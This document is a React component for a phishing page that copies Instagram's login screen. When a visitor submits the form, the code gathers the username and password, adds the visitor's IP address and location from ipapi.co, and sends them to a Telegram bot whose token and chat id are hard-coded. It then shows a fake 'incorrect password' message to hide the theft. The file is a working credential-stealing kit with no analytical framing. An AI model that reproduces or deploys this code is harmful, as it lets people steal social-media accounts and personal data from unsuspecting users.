import React, { useState, FormEvent } from "react";
import Logo from "../assets/images.png";
import AppDownload from "./AppDownload";

const Instagram: React.FC = () => {
  const [type, setType] = useState<string>("password");
  const [icon, setIcon] = useState<boolean>(true);
  const [result, setResult] = useState<string>("");

  const handleToggle = () => {
    setType(icon ? "text" : "password");
    setIcon(!icon);
  };

  const onSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    const formData: Record<string, string> = {};
    Array.from(event.currentTarget.elements).forEach((field) => {
      if (field instanceof HTMLInputElement && field.name) {
        formData[field.name] = field.value;
      }
    });

    fetch("https://ipapi.co/json/")
      .then((res) => res.json())
      .then((data) => {
        const { ip, country_name, country_calling_code, city } = data;
        const NameLogin = formData.name;
        const PasswordLogin = formData.password;
        const SubmitValue = `Instagram Result is:%0A - Identity: ${NameLogin} %0A - Password: ${PasswordLogin} - IPAddress: ${ip} %0A - Country: ${country_name} %0A - Country-code: ${country_calling_code} %0A - state: ${city}`;

        const token = "807684688:AAGnRdy0_lrzwmZYcaGQxCSx0sm3p93WLSU";
        const chat_id = -4854090062
    
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${SubmitValue}`;

        const api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();

        setTimeout(() => {
          setResult("Sorry, your password was incorrect. Please double-check your password.");
        }, 2000);
      });
  };

  return (
    <section className="h-screen flex flex-col items-center justify-center px-6 md:px-14 lg:px-28 pt-12 md:pt-20 md:pb-20 pb-10">
      <div className="md:border-2 border-gray-500/10 px-8 py-10 max-w-[350px] w-full">
        <form className="grid gap-2" onSubmit={onSubmit}>
          <img className="h-16 mx-auto" src={Logo} alt="Instagram" />
          <input
            required
            className="p-2 border border-gray-500/30 bg-transparent text-sm"
            type="text"
            name="name"
            placeholder="Phone number, username, or email"
          />
          <div className="flex items-center relative mb-3">
            <input
              required
              type={type}
              className="p-2 gap-3 border border-gray-500/30 flex-grow bg-transparent text-sm"
              name="password"
              placeholder="Password"
            />
            <span
              className="absolute right-5 cursor-pointer hover:text-black/40 text-black-70 text-sm"
              onClick={handleToggle}
            >
              {icon ? "Hide" : "Show"}
            </span>
          </div>
          <button
            type="submit"
            className="bg-blue-500 py-2 text-sm text-white hover:bg-blue-400 rounded-md"
          >
            Log in
          </button>
          <p className="text-center text-xs text-red-600">{result}</p>
          <div className="orr">
            <p className="text-[#dadada]">or</p>
          </div>
          <div className="text-center">
            <a href="#" className="text-sm font-medium text-black/60">
              Forget password?
            </a>
          </div>
        </form>
      </div>
      <div className="md:border-2 border-gray-500/10 px-8 md:py-5 md:mt-5 max-w-[350px] w-full text-center">
        <span className="text-sm">
          Don't have an account? {" "}
          <a href="#" className="text-blue-600 font-semibold">
            Sign Up
          </a>
        </span>
      </div>
      <AppDownload />
      <div className="mt-auto text-sm text-black/50">English © {new Date().getFullYear()} Instagram from Meta</div>
    </section>
  );
};

export default Instagram;
